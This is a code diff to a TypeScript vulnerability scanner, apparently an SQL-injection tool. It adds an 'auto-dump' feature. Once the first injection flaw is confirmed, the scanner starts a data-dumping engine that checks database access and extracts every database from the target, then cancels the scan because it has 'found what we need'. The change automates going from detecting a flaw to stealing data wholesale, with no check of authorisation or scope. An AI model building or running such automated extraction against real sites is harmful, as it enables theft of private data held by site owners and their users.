@@ -76,6 +76,8 @@ export class VulnerabilityScanner {
   };
   private targetStates: Map<string, TargetState> = new Map();
   private multiTargetMode = false;
+  private firstVulnFound = false; // Track first vulnerability for auto-dumping
+  private dumpingStarted = false; // Track if dumping already started
 
   constructor(scanId: number, targetUrl: string, scanMode: ScanMode = "sqli", threads: number = 10, budget?: Partial<ScanBudget>) {
     this.scanId = scanId;
@@ -230,6 +232,52 @@ export class VulnerabilityScanner {
     return this.cancelled;
   }
 
+  /**
+   * Start auto-dumping after finding first confirmed vulnerability
+   */
+  private async startAutoDumping(vuln: Omit<InsertVulnerability, "scanId">): Promise<void> {
+    try {
+      await this.logger.info("Scanner", `Starting auto-dump for ${vuln.url} - Parameter: ${vuln.parameter}`);
+      
+      // Import DataDumpingEngine
+      const { DataDumpingEngine } = await import("./data-dumping-engine");
+      
+      const context = {
+        targetUrl: vuln.url,
+        vulnerableParameter: vuln.parameter!,
+        dbType: "mysql" as const,
+        technique: "error-based" as const,
+        injectionPoint: vuln.payload || "",
+        signal: this.abortController.signal,
+        onProgress: async (progress: number, message: string) => {
+          await this.logger.info("Dumper", `[${progress}%] ${message}`);
+        },
+        onLog: async (level: string, message: string) => {
+          await this.logger.info("Dumper", message);
+        },
+      };
+      
+      const engine = new DataDumpingEngine(context);
+      
+      // Test database connection
+      const dbInfo = await engine.getCurrentDatabaseInfo();
+      
+      if (dbInfo && dbInfo.name && dbInfo.name !== "unknown") {
+        await this.logger.info("Scanner", `✅ Database accessible: ${dbInfo.name}`);
+        
+        // Start full dump
+        const result = await engine.extractAll();
+        
+        await this.logger.info("Scanner", `✅ Dump completed: ${result.databases.length} databases extracted`);
+      } else {
+        await this.logger.warn("Scanner", "⚠️ Database not accessible - dump failed");
+      }
+      
+    } catch (error: any) {
+      await this.logger.error("Scanner", "Auto-dump failed", error);
+    }
+  }
+
   private async log(level: string, message: string): Promise<void> {
     try {
       await storage.createScanLog({
@@ -299,6 +347,23 @@ export class VulnerabilityScanner {
 
       if (vulnToReport.verificationStatus === "confirmed") {
         this.summary.confirmed++;
+        
+        // AUTO-DUMP: Start dumping after first confirmed vulnerability
+        if (!this.firstVulnFound && !this.dumpingStarted && vulnToReport.parameter) {
+          this.firstVulnFound = true;
+          this.dumpingStarted = true;
+          
+          await this.logger.info("Scanner", "🎯 First confirmed vulnerability found! Starting auto-dump...");
+          
+          // Start dumping in background (don't block scanner)
+          this.startAutoDumping(vulnToReport).catch(err => {
+            this.logger.error("Scanner", "Auto-dump failed", err as Error);
+          });
+          
+          // STOP SCANNER: We found what we need
+          await this.logger.info("Scanner", "✋ Stopping scanner - vulnerability confirmed and dumping started");
+          this.cancel();
+        }
       } else if (vulnToReport.verificationStatus === "potential") {
         this.summary.potential++;
       }
